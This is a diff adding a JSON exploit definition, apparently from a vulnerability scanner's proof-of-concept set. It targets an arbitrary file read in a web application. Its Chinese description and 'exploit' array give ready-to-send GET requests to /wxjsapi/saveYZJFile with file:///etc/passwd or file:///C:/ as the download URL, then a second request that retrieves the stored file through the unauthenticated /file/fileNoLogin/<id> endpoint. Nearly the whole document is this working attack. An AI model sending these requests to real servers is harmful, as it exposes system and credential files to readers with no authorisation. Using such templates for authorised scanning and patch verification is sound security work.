@@ -1,0 +1,18 @@
+{
+    "step": 2,
+    "description": "\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u53ef\u76ee\u5f55\u904d\u5386\nWindows\u8bfb\u53d6POC: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\nLinux\u8bfb\u53d6POC: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\n\u8bb0\u5f55\u7b2c\u4e00\u6b65\u4e2d\u8fd4\u56de\u7684ID\u503c\uff0c\u8c03\u7528\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee/file/fileNoLogin/<id>",
+    "exploit": [
+        {
+            "method": "GET",
+            "path": "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt",
+            "header": {},
+            "body": ""
+        },
+        {
+            "method": "GET",
+            "path": "/file/fileNoLogin/<id>",
+            "header": {},
+            "body": ""
+        }
+    ]
+}
